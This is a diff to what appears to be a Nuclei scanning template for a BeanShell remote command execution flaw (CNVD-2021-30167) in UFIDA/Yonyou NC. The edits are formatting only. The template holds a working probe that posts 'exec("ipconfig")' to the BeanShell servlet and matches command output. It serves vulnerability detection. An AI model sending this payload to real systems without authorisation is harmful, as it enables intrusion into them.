@@ -1,5 +1,4 @@
 id: CNVD-2021-30167
-
 info:
   name: UFIDA NC BeanShell Remote Command Execution
   author: pikpikcu
@@ -15,8 +14,7 @@ info:
     cwe-id: CWE-77
   metadata:
     max-request: 2
-  tags: cnvd2021,cnvd,beanshell,rce,yonyou,vuln
-
+  tags: beanshell,cnvd,cnvd2021,rce,vuln,yonyou
 http:
   - raw:
       - | #linux
@@ -31,7 +29,6 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         bsh.script=exec("ipconfig");
-
     matchers-condition: and
     matchers:
       - type: regex
@@ -39,12 +36,10 @@ http:
           - "uid="
           - "Windows IP"
         condition: or
-
       - type: word
         words:
           - "BeanShell Test Servlet"
-
       - type: status
         status:
           - 200
-
+        # digest: 4a0a00473045022054ff15bb2fa9d61bb8455941a58bf7d3bb88f654ba5cf6cb86abbe231fe8acad022100f463d07451e117c23371548015935ec8ed301a5a224642a653596baaaa8d1ce8:922c64590222798bb761d5b6d8e72950
